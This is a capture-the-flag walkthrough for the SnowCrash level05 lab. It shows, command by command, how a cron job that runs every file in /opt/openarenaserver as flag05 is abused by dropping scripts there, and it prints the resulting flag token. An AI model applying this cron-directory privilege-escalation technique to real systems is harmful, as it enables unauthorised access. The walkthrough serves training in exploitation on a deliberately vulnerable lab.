Once logged in the system prompt to us the following msg "You have a new mail."

```
[~]$ ssh level05@10.12.177.116 -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          10.12.177.116
level05@10.12.177.116's password:
You have new mail.
```

After we execute the find command to look for related files to level05

```
level05@SnowCrash:~$ find / -name level05 2>/dev/null
/var/mail/level05
/rofs/var/mail/level05
level05@SnowCrash:~$
```

We get the /var/mail/level05 which indicate that a running conjob is executing the script /usr/sbin/openarenaserver as flag05 user

```
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:~$
```

Now looking the source code of the script it's obvious that it's looping through all files in 
/opt/openarenaserver folder and execute them with bash as follow

```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:~$
```


Now let's try to add a script called flag in /opt/openarenaserver executing getflag command. We wait 2 min and check for /opt/openarenaserver/flag file.

```
level05@SnowCrash:/opt/openarenaserver$ echo "whoami > /opt/openarenaserver/works" > cmd
level05@SnowCrash:/opt/openarenaserver$ ls
cmd
level05@SnowCrash:/opt/openarenaserver$ echo "getflag > /opt/openarenaserver/flag" > flash
level05@SnowCrash:/opt/openarenaserver$ ls
level05@SnowCrash:/opt/openarenaserver$ cat flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:/opt/openarenaserver$ cat works
flag05
```
